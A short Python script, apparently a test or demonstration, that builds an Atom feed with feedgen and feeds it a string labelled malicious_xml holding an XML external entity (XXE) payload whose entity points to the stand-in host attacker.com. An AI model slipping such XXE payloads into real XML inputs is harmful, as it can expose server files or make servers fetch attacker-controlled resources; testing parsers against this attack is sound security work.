from feedgen.feed import FeedGenerator

def create_rss_feed(xml_content):
    fg = FeedGenerator()
    fg.id('http://example.com/feed')
    fg.title('Example Feed')
    fg.link(href='http://example.com', rel='self')
    fg.description('This is an example feed.')

    fg.add_entry().title('Example Entry').content(xml_content, type='html')

    return fg.atom_str(pretty=True)

malicious_xml = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/malicious">
]>
<feed>
  <entry>
    <title>Example Entry</title>
    <content>&xxe;</content>
  </entry>
</feed>
"""

try:
    rss_feed = create_rss_feed(malicious_xml)
    print(rss_feed)
except Exception as e:
    print(f"An error occurred: {e}")